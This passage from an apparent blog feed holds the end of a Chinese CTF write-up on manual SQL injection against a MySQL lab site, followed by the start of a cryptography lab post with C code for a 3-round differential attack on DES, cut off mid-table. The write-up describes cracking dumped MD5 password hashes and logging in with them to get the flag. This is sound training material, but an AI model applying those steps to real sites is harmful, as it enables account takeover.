src="/2023/12/21/web-an-quan-sql-shou-gong-zhu-ru-lou-dong-ce-shi-mysql-shu-ju-ku/image-20231222000419134.png"></p><p>一般网站密码是m5d加密，<a href="https://www.cmd5.com/">md5解密工具</a></p><p><img src="/2023/12/21/web-an-quan-sql-shou-gong-zhu-ru-lou-dong-ce-shi-mysql-shu-ju-ku/image-20231222000643235.png"></p><p><img src="/2023/12/21/web-an-quan-sql-shou-gong-zhu-ru-lou-dong-ce-shi-mysql-shu-ju-ku/image-20231222000606252.png"></p><p>这样用户密码都出来了，第一个发现被封了</p><p><img src="/2023/12/21/web-an-quan-sql-shou-gong-zhu-ru-lou-dong-ce-shi-mysql-shu-ju-ku/image-20231222000857204.png"></p><p>第二个登录进去得到flag</p><p><img src="/2023/12/21/web-an-quan-sql-shou-gong-zhu-ru-lou-dong-ce-shi-mysql-shu-ju-ku/image-20231222000954968.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/weixin_61864052/article/details/121683120">SQL注入基础(最主要参考)</a></p><p><a href="https://blog.csdn.net/lianliandad/article/details/126864682">墨者学院-XWAY科技管理系统V3.0</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> WEB Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学实验--3轮差分攻击DES算法</title>
      <link href="/2023/12/15/mi-ma-xue-shi-yan-3-lun-chai-fen-gong-ji-des-suan-fa/"/>
      <url>/2023/12/15/mi-ma-xue-shi-yan-3-lun-chai-fen-gong-ji-des-suan-fa/</url>
      
        <content type="html"><![CDATA[<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* *************************************************************************** *       Filename:  des.c * *    Description:  DES encryption and decryption implementation, with *                  DC(differential cryptanalysis) attacking to 3-round DES. * *        Version:  1.0 *        Created:  10/25/2007 04:50:01 PM CST *       Revision:  none *       Compiler:  gcc 4.1.3 * *       The DES de/encryption algorithm *         Author: Jim Gillogly, May 1977 *       Modified: 8/84 by Jim Gillogly and Lauren Weinstein to compile with *                 post-1977 C compilers and systems * *       Modified and added DC attacking algorithm, 10/25/2007 *         Author:  Wenbo Yang &lt;http://solrex.cn&gt; *        Company:  the State Key Laboratory of Information Security *                  CAS, Beijing, China. * * This program is now officially in the public domain, and is available for * any non-profit use as long as the authorship line is retained. ************************************************************************** */</span><span class="token comment">/* Permutation algorithm: *The permutation is defined by its effect on each of the 16 nibbles *of the 64-bit input.  For each nibble we give an 8-byte bit array *that has the bits in the input nibble distributed correctly.  The *complete permutation involves ORing the 16 sets of 8 bytes designated *by the 16 input nibbles.  Uses 16*16*8 = 2K bytes of storage for *each 64-bit permutation.  32-bit permutations (P) and expansion (E) *are done similarly, but using bytes instead of nibbles. *Should be able to use long ints, adding the masks, at a *later pass.  Tradeoff: can speed 64-bit perms up at cost of slowing  *down expansion or contraction operations by using 8K tables here and *decreasing the size of the other tables. * The compressions are pre-computed in 12-bit chunks, combining 2 of the *6-&gt;4 bit compressions. * The key schedule is also precomputed. */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span><span class="token comment">/* structure to store plaintext and ciphertext blocks in pair(DC) */</span><span class="token keyword">struct</span> <span class="token class-name">text_pair</span><span class="token punctuation">{</span>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> first<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> second<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment">/* structure to store S box input in pair(DC) */</span><span class="token keyword">struct</span> <span class="token class-name">sin_pair</span><span class="token punctuation">{</span>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> first<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> second<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment">/* structure to store S box output in pair(DC) */</span><span class="token keyword">struct</span> <span class="token class-name">sout_pair</span><span class="token punctuation">{</span>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> first<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> second<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment">/* Some useful macros used as function arguments(DC) */</span><span class="token keyword">enum</span> <span class="token punctuation">{</span>  NO_IP <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>  HAVE_IP <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span>  NO_LAST_SWAP <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>  LAST_SWAP <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span>  BIN_M <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>  HEX_M <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span>  DEC_M <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token comment">/* identical, final and  inital permutations */</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> Iperm<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> iperm<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> fperm<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4096</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token comment">/* S1 thru S8 precomputed */</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> p32<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">/* for permuting 32-bit f output */</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> rp32<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">/* for reverse permuting 32-bit f output */</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> kn<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token comment">/* key selections */</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> J<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment">/* J matrix to determine key(DC) */</span><span class="token comment">/* Const string for printing binary numers. */</span><span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>bin<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>   <span class="token string">"0000"</span><span class="token punctuation">,</span> <span class="token string">"0001"</span><span class="token punctuation">,</span> <span class="token string">"0010"</span><span class="token punctuation">,</span> <span class="token string">"0011"</span><span class="token punctuation">,</span> <span class="token string">"0100"</span><span class="token punctuation">,</span> <span class="token string">"0101"</span><span class="token punctuation">,</span> <span class="token string">"0110"</span><span class="token punctuation">,</span> <span class="token string">"0111"</span><span class="token punctuation">,</span>  <span class="token string">"1000"</span><span class="token punctuation">,</span> <span class="token string">"1001"</span><span class="token punctuation">,</span> <span class="token string">"1010"</span><span class="token punctuation">,</span> <span class="token string">"1011"</span><span class="token punctuation">,</span> <span class="token string">"1100"</span><span class="token punctuation">,</span> <span class="token string">"1101"</span><span class="token punctuation">,</span> <span class="token string">"1110"</span><span class="token punctuation">,</span> <span class="token string">"1111"</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> I<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>   <span class="token comment">/* identical permutation P */</span>   <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>   <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span>  <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span>  <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span>  <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span>  <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span>  <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span>  <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">64</span> <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> ip<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token comment">/* initial permutation P */</span>  <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">7</span> <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> fp<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token comment">/* final permutation F */</span>  <span class="token number">40</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span>  <span class="token number">39</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span>  <span class="token number">38</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span>  <span class="token number">37</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span>  <span class="token number">36</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span>  <span class="token number">35</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span>  <span class="token number">34</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span>  <span class="token number">33</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">25</span> <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> pc1<span class="token punctuation">[</span><span class="token number">56</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token comment">/* PC-1 (key) */</span>  <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>   <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span>  <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span>  <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span>  <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>   <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span>  <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span>  <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">4</span> <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> rpc1<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token comment">/* reverse PC-1 (key, DC) */</span>   <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span>  <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> totrot<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token comment">/* number left rotations of PC-1 */</span>  <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">27</span><span class="token punctuation">,</span><span class="token number">28</span> <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> pc1m<span class="token punctuation">[</span><span class="token number">56</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token comment">/* place to modify pc1 into */</span><span class="token keyword">static</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> pcr<span class="token punctuation">[</span><span class="token number">56</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token comment">/* place to rotate pc1 into */</span><span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> pc2<span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token comment">/* PC-2 (key)  */</span>  <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>   <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">16</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span>  <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token 